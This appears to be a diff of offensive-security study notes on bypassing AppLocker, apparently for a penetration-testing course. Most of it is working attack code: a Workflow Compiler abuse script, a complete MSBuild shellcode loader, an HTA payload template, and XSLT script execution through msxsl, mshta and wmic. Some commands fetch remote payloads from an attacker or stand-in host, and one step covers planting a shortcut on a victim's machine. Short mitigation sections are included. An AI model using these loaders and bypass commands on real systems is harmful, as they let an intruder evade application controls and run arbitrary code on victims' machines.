@@ -331,4 +331,252 @@ String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://19
 
 ## 8.4. Bypassing AppLocker with C\#
 
+##### 8.4.2
+
+- Use Microsoft.Workflow.Compiler.exe to generate an xml file that will compile and run code in a file (here we name test.txt)
+- M.W.C.exe takes two arguments
+	- First is path to an xml file with compiler flags
+	- Path to file containing C# code
+- allow compile and load into memory without restrictions
+- C# code must contain a class that inherits from the System.Workflow.ComponentModel namespace (eg `public class Run : Activty`)
+```powershell
+$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
+$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
+$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
+Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
+$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
+$compilerparam.GenerateInMemory = $True
+$pathvar = "test.txt"
+$output = "C:\Tools\run.xml"
+$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
+Move-Item $tmp $output
+$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
+```
+- contents of test.txt
+```csharp
+using System;
+using System.Workflow.ComponentModel;
+public class Run : Activity{
+    public Run() {
+        Console.WriteLine("I executed!");
+    }
+}
+```
+
+```powershell
+C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
+```
+
+#### Using MSBuild.exe
+- References: https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
+
+```xml
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+         <!-- This inline task executes shellcode. -->
+         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+         <!-- Save This File And Execute The Above Command -->
+         <!-- Author: Casey Smith, Twitter: @subTee -->
+         <!-- License: BSD 3-Clause -->
+	  <Target Name="Hello">
+	    <ClassExample />
+	  </Target>
+	  <UsingTask
+	    TaskName="ClassExample"
+	    TaskFactory="CodeTaskFactory"
+	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	    <Task>
+	    
+	      <Code Type="Class" Language="cs">
+	      <![CDATA[
+		using System;
+		using System.Runtime.InteropServices;
+		using Microsoft.Build.Framework;
+		using Microsoft.Build.Utilities;
+		public class ClassExample :  Task, ITask
+		{         
+		  private static UInt32 MEM_COMMIT = 0x1000;          
+		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
+		  [DllImport("kernel32")]
+		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
+		  [DllImport("kernel32")]
+		    private static extern IntPtr CreateThread(            
+		    UInt32 lpThreadAttributes,
+		    UInt32 dwStackSize,
+		    UInt32 lpStartAddress,
+		    IntPtr param,
+		    UInt32 dwCreationFlags,
+		    ref UInt32 lpThreadId           
+		    );
+		  [DllImport("kernel32")]
+		    private static extern UInt32 WaitForSingleObject(           
+		    IntPtr hHandle,
+		    UInt32 dwMilliseconds
+		    );          
+		  public override bool Execute()
+		  {
+			//replace with your own shellcode
+		    byte[] shellcode = new byte[] { 0xfc,...,0xd5 };
+		      
+		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+		      IntPtr hThread = IntPtr.Zero;
+		      UInt32 threadId = 0;
+		      IntPtr pinfo = IntPtr.Zero;
+		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+		      WaitForSingleObject(hThread, 0xFFFFFFFF);
+		      return true;
+		  } 
+		}     
+	      ]]>
+	      </Code>
+	    </Task>
+	  </UsingTask>
+	</Project>
+```
+
+- Can build and execute using MSBuild
+```powershell
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad.xml
+```
+
+
+### JScript
+
+`mshta.exe` is a legitimate Windows utility used to execute Microsoft HTML Application (HTA) files. HTA files are essentially HTML documents that have the `.hta` file extension and can run JavaScript, VBScript, or other scripting languages in a standalone window without the restrictions typically placed on scripts running within a web browser.
+
+#### Common Uses of `mshta.exe`
+- **Executing HTA Files**: The primary purpose of `mshta.exe` is to open and run HTA files.
+- **Running Inline Scripts**: It can also be used to execute scripts directly from the command line.
+- **Embedding in HTML**: Often used to create interactive web applications with a greater degree of control over the user interface and system resources than is typically available through standard web pages.
+
+#### Syntax
+```sh
+mshta.exe <path_to_htafile>
+```
+Or to execute inline scripts:
+```sh
+mshta.exe vbscript:Execute("MsgBox(\"Hello World\")")
+```
+
+#### Security Considerations
+While `mshta.exe` is a legitimate tool, it can be abused by attackers to run malicious scripts. This makes it a common vector for malware and other malicious activities. 
+
+#### Examples of Abuse
+- **Running Malicious Scripts**: Attackers can use `mshta.exe` to execute malicious JavaScript or VBScript directly from the command line or via a malicious HTA file.
+- **Bypassing Security Measures**: Due to its legitimate nature, `mshta.exe` can sometimes bypass security software that might block more obvious malicious executables.
+
+#### Example of Malicious Use
+An attacker might craft a command to download and execute a malicious script:
+```sh
+mshta.exe "http://malicious.website/malicious.hta"
+```
+
+#### Mitigation and Defense
+- **Monitoring**: Keep an eye on the execution of `mshta.exe` on endpoints. It is unusual for most users to execute HTA files frequently.
+- **Restrict Execution**: Implement policies to restrict the use of `mshta.exe` if it is not required in your environment.
+- **Endpoint Protection**: Use endpoint protection solutions that can detect and block the execution of suspicious scripts and HTA files.
+
+By understanding `mshta.exe` and its potential for abuse, you can better protect your systems from associated threats.
+
+
+#### POC
+```js
+<html> 
+<head> 
+<script language="JScript">
+<!--- PASTE JSCRIPT PAYLOAD BELOW --->
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+<!--- PASTE JSCRIPT ABOVE--->
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
+```
+
+```cmd
+mshta test.hta
+```
+
+### XSL Transform
+#### Malicious use
+- start webserver
+- save POC in web root  
+- create a shortcut `C:\\Windows\\System32\\mshta.exe http://<attacker ip>/test.hta` and name it
+- have to get shortcut file on victim's machine
+- Can use DotNetToJscript or SuperSharpShooter to generate payload to plant in the hta file
+
+Using XSLT (Extensible Stylesheet Language Transformations) to bypass AppLocker can be a technique employed by attackers to execute arbitrary code in an environment where AppLocker policies are enforced to restrict executable files. Here's a step-by-step explanation of how this technique might be used:
+
+#### What is XSLT?
+XSLT is a language for transforming XML documents into other formats such as HTML, text, or another XML document. 
+
+#### Using XSLT to Execute Code
+1. **Craft an XSLT File**: The attacker creates an XSLT file that contains embedded script or commands to be executed. XSLT has elements like `<msxsl:script>` that can contain JScript or VBScript.
+
+2. **Invoke the XSLT File**: The attacker uses a legitimate Windows utility (like `msxsl.exe` or Internet Explorer) to process the malicious XSLT file.
+
+Here's an example of an XSLT file (`malicious.xsl`) with embedded JScript:
+
+```xml
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
+    <msxsl:script language="JScript" implements-prefix="user">
+        <![CDATA[
+        function execute() {
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run("cmd.exe /c calc.exe");
+        }
+        ]]>
+    </msxsl:script>
+    <xsl:template match="/">
+        <xsl:value-of select="user:execute()"/>
+    </xsl:template>
+</xsl:stylesheet>
+```
+
+#### Steps to Bypass AppLocker
+1. **Create the Malicious XSLT File**: Save the above XSLT code into a file named `malicious.xsl`.
+
+2. **Invoke the XSLT File**: Use `msxsl.exe` or Internet Explorer to run the XSLT file. For example:
+
+```sh
+msxsl.exe input.xml malicious.xsl
+```
+
+or
+
+```sh
+mshta.exe "about:<html><head><xml id='xsl' src='file:///C:/path/to/malicious.xsl'/><script>new ActiveXObject('Msxml2.DOMDocument.6.0').transformNodeToObject(new ActiveXObject('Msxml2.DOMDocument.6.0').loadXML('<root/>'), document.all.xsl);</script></head><body></body></html>"
+```
+
+or 
+
+```cmd
+wmic process get brief /format:"http://192.168.0.1/test.xsl"
+```
+
+or 
+
+```cmd
+wmic process call create "wmic os get /format:'file://C:/path/to/malicious.xsl'"
+```
+
+#### Security Implications
+- **Bypassing Restrictions**: Since `msxsl.exe` and `mshta.exe` are typically not restricted by AppLocker policies, they can be used to execute arbitrary code through the XSLT transformation process.
+- **Misuse of Legitimate Tools**: This technique abuses legitimate system tools, making it harder for security software to detect the malicious activity.
+
+#### Mitigation Strategies
+- **Restrict Executable Use**: Restrict the use of tools like `msxsl.exe` and `mshta.exe` if they are not needed in your environment.
+- **AppLocker Configuration**: Ensure that AppLocker policies are configured to also restrict the execution of script processors and other tools that can be used to bypass restrictions.
+- **Monitoring and Alerts**: Monitor for unusual use of tools like `msxsl.exe` and `mshta.exe` and set up alerts for their execution.
+
+By understanding how XSLT can be used to bypass AppLocker, you can better protect your systems by implementing more comprehensive security measures and monitoring.
 
